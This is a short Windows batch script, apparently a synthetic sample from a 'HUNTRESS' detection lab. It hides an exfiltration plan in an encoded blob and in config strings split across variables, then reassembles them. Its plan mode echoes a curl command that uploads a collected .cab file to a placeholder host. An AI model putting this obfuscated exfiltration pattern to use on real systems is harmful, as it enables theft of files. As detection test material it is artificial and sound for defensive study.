@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:base64_literal|rotate_left
rem HUNTRESS-MATERIAL:7Hpi+OboyuDmetjexsLoyr7Y3sbC2Fjg5MrgwuTKvujkwtzmzMrkWOrg2N7CyL7kytre6Mr4wsjC4OjK5HrG6uTYXMrwyvjm6MLOyr7G3urc6Hpi+M7kwuDQetjS3MrC5PjcyvDovtjC3M7qws7Ketze3Mr4xsLa4MLSzty+0sh6xsLa4MLSztxayGxsYsLCxGRsyvjm3urkxsq+4MLo0HqGdLiq5srk5rig6sTY0sa4kOrc6OTK5uaYwsS4xt7Y2MrG6FrIbGxiwsLEZGzKXMbCxPjq4Njewsi+6uTYetDo6ODmdF5eyGxsYsLCxGRsylzK8MLa4NjKXNLc7MLY0she6uDY3sLI
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set "v_a0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=curl"& rem HUNTRESS quote compound
set "v_a1=.exe|stage_count=1|graph=linear|next_language=none|campaign_id=cam"& rem HUNTRESS quote compound
set "v_a2=paign-d661aab26e|source_path=C:\Users\Public\HuntressLab\collect-d"& rem HUNTRESS quote compound
set "v_a3=661aab26e.cab|upload_url=https://d661aab26e.example.invalid/upload"& rem HUNTRESS quote compound
goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE
set "neutral_string_join=a9109470"
for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
call set "cfg=%%v_a0%%%%v_a1%%%%v_a2%%%%v_a3%%"
exit /b 0
:HUNTRESS_EMIT
echo(!cfg!
exit /b 0
:HUNTRESS_PLAN
echo curl.exe upload C:\Users\Public\HuntressLab\collect-d661aab26e.cab to https://d661aab26e.example.invalid/upload
exit /b 0
